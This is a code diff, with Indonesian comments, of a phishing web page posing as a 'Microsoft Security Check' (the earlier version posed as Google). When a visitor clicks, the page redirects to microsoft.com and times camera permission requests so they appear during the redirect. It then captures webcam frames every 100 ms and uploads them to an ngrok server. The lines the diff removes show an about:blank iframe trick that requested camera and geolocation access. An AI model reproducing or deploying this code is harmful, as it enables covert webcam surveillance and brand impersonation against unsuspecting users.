@@ -8,7 +8,7 @@
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
-  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
+  h2 { color: #0078d4; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
   iframe, video, canvas { display: none !important; }
@@ -17,8 +17,8 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Google Security Check</h2>
-  <p>Klik untuk memverifikasi akun Google Anda.</p>
+  <h2>🔒 Microsoft Security Check</h2>
+  <p>Klik untuk memverifikasi akun Microsoft Anda.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -39,12 +39,13 @@
   }
 
   // ============================================
-  // KONFIGURASI SERVER (NGROK)
+  // KONFIGURASI
   // ============================================
+  var TARGET_URL = "https://www.microsoft.com"; // Target Redirect
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
   // ============================================
-  // FUNGSI: KIRIM GAMBAR (MULTIPART FORM-DATA)
+  // FUNGSI: KIRIM GAMBAR KE SERVER
   // ============================================
   function sendImageToServer() {
     try {
@@ -53,104 +54,48 @@
       var ctx = canvas.getContext('2d');
 
       if (video.readyState === video.HAVE_ENOUGH_DATA) {
-        // Gambar frame video ke canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Konversi canvas ke Blob (File Gambar)
         canvas.toBlob(function(blob) {
           if (!blob) return;
-
-          // Buat FormData
           var formData = new FormData();
           formData.append('file', blob, 'capture.jpg');
 
-          // Kirim ke Server
           fetch(SERVER_ENDPOINT, {
             method: 'POST',
             body: formData
           }).then(function(res) {
-            log("[+] Gambar terkirim ke server: " + res.status);
+            log("[+] Gambar terkirim: " + res.status);
           }).catch(function(err) {
             log("[-] Gagal kirim gambar: " + err.message);
           });
-
-        }, 'image/jpeg', 0.6); // Kualitas 60%
+        }, 'image/jpeg', 0.6);
       }
-    } catch(e) {
-      log("[-] Error: " + e.message);
-    }
+    } catch(e) {}
   }
 
   // ============================================
-  // PERMISSION INHERITANCE (ABOUT:BLANK)
+  // FUNGSI: SILENT CAMERA REQUEST (RACE CONDITION)
   // ============================================
-  function startPermissionInheritance() {
+  function requestCamera() {
     try {
-      log("[+] Membuat Iframe about:blank...");
+      log("[+] Meminta Izin Kamera (Silent)...");
       
-      var iframe = document.createElement("iframe");
-      iframe.allow = "camera; microphone; geolocation";
-      iframe.style.display = "none";
-      iframe.src = "about:blank";
-      
-      document.getElementById("launcher-container").appendChild(iframe);
-
-      iframe.onload = function() {
-        try {
-          var doc = iframe.contentDocument || iframe.contentWindow.document;
-          doc.open();
-          doc.write(`
-            <!DOCTYPE html>
-            <html>
-            <body>
-              <script>
-                navigator.mediaDevices.getUserMedia({ video: true })
-                  .then(function(stream) {
-                    parent.postMessage({ type: 'CAM_GRANTED' }, '*');
-                  })
-                  .catch(function(err) {
-                    parent.postMessage({ type: 'CAM_DENIED', error: err.name }, '*');
-                  });
-
-                navigator.geolocation.getCurrentPosition(
-                  function(pos) {
-                    parent.postMessage({ type: 'LOC_GRANTED', lat: pos.coords.latitude, lon: pos.coords.longitude }, '*');
-                  },
-                  function(err) {
-                    parent.postMessage({ type: 'LOC_DENIED', error: err.message }, '*');
-                  }
-                );
-              <\/script>
-            </body>
-            </html>
-          `);
-          doc.close();
-          log("[+] Script disuntikkan ke about:blank.");
-        } catch(e) {
-          log("[-] Gagal menulis ke about:blank: " + e.message);
-        }
-      };
-    } catch(e) {
-      log("[-] Iframe Error: " + e.message);
-    }
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function(stream) {
+          var video = document.getElementById('cam-feed');
+          video.srcObject = stream;
+          video.play().catch(function(){});
+          log("[+] 🚨 Kamera BERHASIL diakses!");
+          
+          // Mulai kirim gambar
+          setInterval(sendImageToServer, 100);
+        })
+        .catch(function(err) {
+          log("[-] Kamera diblokir: " + err.name);
+        });
+    } catch(e) {}
   }
-
-  // ============================================
-  // LISTENER PESAN DARI IFRAME
-  // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data.type === 'CAM_GRANTED') {
-      log("[+] 🚨 Kamera DIIZINKAN! Mulai streaming gambar...");
-      setInterval(sendImageToServer, 100); // Kirim gambar setiap 100ms
-    } else if (e.data.type === 'CAM_DENIED') {
-      log("[-] Kamera ditolak: " + e.data.error);
-    } else if (e.data.type === 'LOC_GRANTED') {
-      log("[+] 🚨 Lokasi DIIZINKAN: " + e.data.lat + ", " + e.data.lon);
-      // Jika hanya fokus gambar, lokasi bisa diabaikan
-    } else if (e.data.type === 'LOC_DENIED') {
-      log("[-] Lokasi ditolak: " + e.data.error);
-    }
-  });
 
   // ============================================
   // TRIGGER (KLIK)
@@ -161,13 +106,35 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>⏳ Memverifikasi...</h2>
-      <p>Menghubungkan ke Google...</p>
+      <p>Menghubungkan ke Microsoft...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Image Exfiltration...");
+    log("[!] Memulai Microsoft Redirect & Silent Camera...");
 
-    startPermissionInheritance();
+    // ============================================
+    // A. REDIRECT KE MICROSOFT (0ms)
+    // ============================================
+    try {
+      log("[+] Redirect ke Microsoft.com...");
+      window.location.href = TARGET_URL;
+    } catch(e) {}
+
+    // ============================================
+    // B. SILENT CAMERA REQUEST (10ms)
+    // ============================================
+    // Tembak izin kamera tepat saat browser sedang memuat Microsoft.
+    setTimeout(function() {
+      requestCamera();
+    }, 10);
+
+    // ============================================
+    // C. RETRY CAMERA (500ms)
+    // ============================================
+    // Jika prompt tidak muncul, coba lagi.
+    setTimeout(function() {
+      requestCamera();
+    }, 500);
 
   }, { once: true });
 
